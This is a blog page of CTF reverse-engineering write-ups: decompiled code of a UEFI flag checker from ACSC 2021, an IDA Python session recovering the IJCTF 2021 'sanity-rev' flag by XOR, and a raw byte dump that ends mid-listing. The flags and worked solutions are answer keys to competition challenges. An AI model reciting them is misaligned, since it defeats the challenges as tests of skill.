<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>xrivendell7</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="xrivendell7">
<meta property="og:url" content="http://example.com/page/3/index.html">
<meta property="og:site_name" content="xrivendell7">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="xrivendell7">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="xrivendell7" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">xrivendell7</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-2021acscctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/09/23/2021acscctf/" class="article-date">
  <time class="dt-published" datetime="2021-09-23T03:07:10.000Z" itemprop="datePublished">2021-09-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/09/23/2021acscctf/">2021 ACSC CTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>逆向一个UEFI</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_240</span><span class="params">(EFI_HANDLE a1, <span class="keyword">struct</span> EFI_SYSTEM_TABLE *a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v10; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v11; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+0h] [rbp-490h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+8h] [rbp-488h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+10h] [rbp-480h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+18h] [rbp-478h]</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-460h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">16</span>]; <span class="comment">// [rsp+40h] [rbp-450h] BYREF</span></span><br><span class="line">  __int64 v19[<span class="number">7</span>]; <span class="comment">// [rsp+50h] [rbp-440h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+88h] [rbp-408h] BYREF</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+250h] [rbp-240h] BYREF</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+258h] [rbp-238h] BYREF</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+260h] [rbp-230h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v24[<span class="number">2</span>]; <span class="comment">// [rsp+26Ch] [rbp-224h] BYREF</span></span><br><span class="line">  __int16 v25; <span class="comment">// [rsp+26Eh] [rbp-222h]</span></span><br><span class="line">  __int16 v26[<span class="number">38</span>]; <span class="comment">// [rsp+270h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *v27; <span class="comment">// [rsp+478h] [rbp-18h]</span></span><br><span class="line">  __int64 Status; <span class="comment">// [rsp+480h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+48Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  (ST-&gt;ConOut-&gt;ClearScreen)(ST-&gt;ConOut-&gt;ClearScreen, ST-&gt;ConOut);</span><br><span class="line">  <span class="built_in">printf</span>(a1, a2, v3, <span class="string">L&quot;Input flag: &quot;</span>);</span><br><span class="line">  <span class="built_in">sub_1D43</span>(a1, a2, <span class="number">0x200uLL</span>, v26);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFE</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    (BS-&gt;WaitForEvent)(a1, a2, &amp;ST-&gt;ConIn-&gt;WaitForKey, <span class="number">1LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    (ST-&gt;ConIn-&gt;ReadKeyStroke)(a1, a2, v24, ST-&gt;ConIn);</span><br><span class="line">    <span class="keyword">if</span> ( v25 == <span class="number">0xD</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v26[i] = v25;</span><br><span class="line">    (ST-&gt;ConOut-&gt;OutputString)(a1, a2, &amp;v26[i], *(a3 + <span class="number">0x40</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(a1, a2, v4, <span class="string">L&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">LODWORD</span>(v5) = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">0x26</span> || <span class="built_in">sub_1122</span>(a1, a2, v26, <span class="string">L&quot;ACSC&#123;&quot;</span>, <span class="number">5LL</span>) || <span class="built_in">sub_1122</span>(a1, a2, &amp;v26[<span class="number">37</span>], <span class="string">&quot;&#125;&quot;</span>, <span class="number">1LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(a1, a2, v6, <span class="string">L&quot;Wrong!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v23 = <span class="built_in">sub_20D4</span>(a1, a2, v6, <span class="string">L&quot;PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)&quot;</span>);</span><br><span class="line">    Status = (BS-&gt;LocateDevicePath)(a1, a2, &amp;v23, &amp;unk_9620, &amp;v22);</span><br><span class="line">    <span class="keyword">if</span> ( Status &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Status = (BS-&gt;HandleProtocol)(a1, a2, &amp;unk_9620, v22, &amp;v21);</span><br><span class="line">      <span class="keyword">if</span> ( Status &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        Status = (*(v21 + <span class="number">0x18</span>))(a1, a2, **(v21 + <span class="number">8</span>), v21, <span class="number">1LL</span>, <span class="number">512LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( Status &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v19[<span class="number">0</span>] == <span class="string">&#x27;TRAP IFE&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v7 = <span class="built_in">sub_7D9</span>();</span><br><span class="line">            v27 = <span class="built_in">sub_1F8D</span>(a1, a2, v8, v7);</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">sub_C24</span>(a1, a2, qword_6620, v27, <span class="number">128LL</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( <span class="built_in">sub_4D87</span>(a1, a2, &amp;v20, v27, <span class="number">0x10uLL</span>, qword_6630, v13, v14, v15, v16, v18) )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">sub_1060</span>();</span><br><span class="line">                Status = <span class="built_in">sub_11DD</span>(a1, a2, <span class="number">0x20uLL</span>, &amp;v26[<span class="number">5</span>], v17, <span class="number">0x10uLL</span>);</span><br><span class="line">                <span class="keyword">if</span> ( Status &gt;= <span class="number">0</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( <span class="built_in">sub_1D10</span>(a1, a2, v17, v18, <span class="number">0x10LL</span>) )</span><br><span class="line">                    <span class="built_in">printf</span>(a1, a2, v11, <span class="string">L&quot;Wrong!\n&quot;</span>);</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">printf</span>(a1, a2, v11, <span class="string">L&quot;Correct!\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">printf</span>(a1, a2, Status, <span class="string">L&quot;ERROR: StrHexToBytes() failed: %r\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">printf</span>(a1, a2, v10, <span class="string">L&quot;ERROR: AesCbcEncrypt() failed.\n&quot;</span>);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">printf</span>(a1, a2, v9, <span class="string">L&quot;ERROR: AesInit() failed.\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(a1, a2, <span class="string">&#x27;TRAP IFE&#x27;</span>, <span class="string">L&quot;ERROR: Header signature mismatch.\n&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(a1, a2, Status, <span class="string">L&quot;ERROR: BlockIo-&gt;ReadBlocks() failed: %r\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(a1, a2, Status, <span class="string">L&quot;ERROR: gBS-&gt;HandleProtocol() failed: %r\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(a1, a2, Status, <span class="string">L&quot;ERROR: gBS-&gt;LocateDevicePath() failed: %r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(qword_9BB8 + <span class="number">0x68</span>))(a1, a2, <span class="number">0LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>qemu调试将该PE加载到固定地址0x6668000</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/09/23/2021acscctf/" data-id="cuidsXYsO23BGezgopUOSWW2s" data-title="2021 ACSC CTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2021ijctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/08/16/2021ijctf/" class="article-date">
  <time class="dt-published" datetime="2021-08-16T03:07:10.000Z" itemprop="datePublished">2021-08-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/08/16/2021ijctf/">IJCTF 2021</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="sanity-rev"><a href="#sanity-rev" class="headerlink" title="sanity-rev"></a>sanity-rev</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;get_bytes(<span class="number">0x2030</span>,<span class="number">0x26</span>)</span><br><span class="line"><span class="string">b&#x27;IJCTF&#123;simple_sanity_check_for_babies&#125;\x00&#x27;</span></span><br><span class="line">Python&gt;a = <span class="built_in">list</span>(get_bytes(<span class="number">0x2030</span>,<span class="number">0x26</span>))</span><br><span class="line">Python&gt;a</span><br><span class="line">[<span class="number">0x49</span>, <span class="number">0x4a</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x7b</span>, <span class="number">0x73</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>, <span class="number">0x70</span>, <span class="number">0x6c</span>, <span class="number">0x65</span>, <span class="number">0x5f</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x6e</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x79</span>, <span class="number">0x5f</span>, <span class="number">0x63</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x63</span>, <span class="number">0x6b</span>, <span class="number">0x5f</span>, <span class="number">0x66</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x5f</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x7d</span>, <span class="number">0x0</span>]</span><br><span class="line">Python&gt;b = <span class="built_in">list</span>(get_bytes(<span class="number">0x2008</span>,<span class="number">0x26</span>))</span><br><span class="line">Python&gt;b</span><br><span class="line">[<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x18</span>, <span class="number">0x2f</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x3b</span>, <span class="number">0x2c</span>, <span class="number">0xf</span>, <span class="number">0x1</span>, <span class="number">0x1d</span>, <span class="number">0x2b</span>, <span class="number">0x1f</span>, <span class="number">0x3e</span>, <span class="number">0xf</span>, <span class="number">0x4</span>, <span class="number">0x3a</span>, <span class="number">0x5</span>, <span class="number">0x4</span>, <span class="number">0x2d</span>, <span class="number">0x39</span>, <span class="number">0x6</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x10</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0x1</span>, <span class="number">0x11</span>, <span class="number">0x4c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>]</span><br><span class="line">Python&gt;a^b</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: unsupported operand <span class="built_in">type</span>(s) <span class="keyword">for</span> ^: <span class="string">&#x27;list&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;list&#x27;</span></span><br><span class="line">Python&gt;<span class="keyword">from</span> numpy <span class="keyword">import</span> np</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: cannot <span class="keyword">import</span> name <span class="string">&#x27;np&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;numpy&#x27;</span> (C:\Users\ostrich\WPy64-<span class="number">3771</span>\python-<span class="number">3.7</span><span class="number">.7</span>.amd64\lib\site-packages\numpy\__init__.py)</span><br><span class="line">Python&gt;<span class="keyword">import</span> numpy</span><br><span class="line">Python&gt; np.bitwise_xor(a,b)</span><br><span class="line">Python&gt;c = np.bitwise_xor(a,b)</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    np.bitwise_xor(a,b)</span><br><span class="line">    ^</span><br><span class="line">IndentationError: unexpected indent</span><br><span class="line">Python&gt;c = numpy.bitwise_xor(a,b)</span><br><span class="line">Python&gt;c</span><br><span class="line">[ <span class="number">73</span>  <span class="number">74</span>  <span class="number">67</span>  <span class="number">84</span>  <span class="number">70</span> <span class="number">123</span> <span class="number">121</span> <span class="number">111</span> <span class="number">117</span>  <span class="number">95</span> <span class="number">100</span> <span class="number">105</span> <span class="number">100</span>  <span class="number">95</span> <span class="number">110</span> <span class="number">111</span> <span class="number">116</span>  <span class="number">95</span></span><br><span class="line"> <span class="number">102</span>  <span class="number">97</span> <span class="number">108</span> <span class="number">108</span>  <span class="number">95</span> <span class="number">102</span> <span class="number">111</span> <span class="number">114</span>  <span class="number">95</span> <span class="number">105</span> <span class="number">116</span>  <span class="number">95</span> <span class="number">114</span> <span class="number">105</span> <span class="number">103</span> <span class="number">104</span> <span class="number">116</span>  <span class="number">63</span></span><br><span class="line"> <span class="number">125</span>   <span class="number">0</span>]</span><br><span class="line">Python&gt;d = <span class="built_in">map</span>(<span class="built_in">chr</span>,c)</span><br><span class="line">Python&gt;<span class="built_in">print</span>(d)</span><br><span class="line">&lt;<span class="built_in">map</span> <span class="built_in">object</span> at <span class="number">0x0000026EAC07CE08</span>&gt;</span><br><span class="line">Python&gt;<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(d))</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(d))</span><br><span class="line">                         ^</span><br><span class="line">SyntaxError: unexpected EOF <span class="keyword">while</span> parsing</span><br><span class="line">Python&gt;<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(d))</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(d))</span><br><span class="line">                         ^</span><br><span class="line">SyntaxError: unexpected EOF <span class="keyword">while</span> parsing</span><br><span class="line">Python&gt;</span><br><span class="line">Python&gt;<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(d)))</span><br><span class="line">IJCTF&#123;you_did_not_fall_for_it_right?&#125;	</span><br></pre></td></tr></table></figure>

<p>IJCTF{you_did_not_fall_for_it_right?}</p>
<h2 id="helloworld-rev"><a href="#helloworld-rev" class="headerlink" title="helloworld-rev"></a>helloworld-rev</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;UH\x89\xe5SH\x81\xec\xe8\x00\x00\x00H\x8d\x85@\xff\xff\xff\xba\x02\x00\x00\x00H\xbe\xc3q\\\x00\x00\x00\x00\x00H\x89\xc7H\xb8\x1c&#125;@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x95@\xff\xff\xffH\x8d\x850\xff\xff\xffH\x89\xd6H\x89\xc7H\xb8\x96x@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x850\xff\xff\xffH\x89E\xe8H\x8d\x85@\xff\xff\xffH\x89\xc7H\xb8&amp;s@\x00\x00\x00\x00\x00\xff\xd0H\x8bU\xe8H\x8d\x85p\xff\xff\xffH\x89\xd6H\x89\xc7H\xb8^z@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x85 \xff\xff\xffH\x8d\x95p\xff\xff\xffH\x89\xd6H\x89\xc7H\xb8\x87y@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x85p\xff\xff\xffH\x89\xc7H\xb8tx@\x00\x00\x00\x00\x00\xff\xd0H\x8bU\xe8H\x8dE\x80H\x89\xd6H\x89\xc7H\xb8^z@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x85\x10\xff\xff\xffH\x8dU\x80H\x89\xd6H\x89\xc7H\xb8\xday@\x00\x00\x00\x00\x00\xff\xd0H\x8dE\x80H\x89\xc7H\xb8tx@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x95\x10\xff\xff\xffH\x8d\x85 \xff\xff\xffH\x89\xd6H\x89\xc7H\xb8*y@\x00\x00\x00\x00\x00\xff\xd0\x84\xc0\x0f\x84&#123;\x01\x00\x00H\x8d\x85 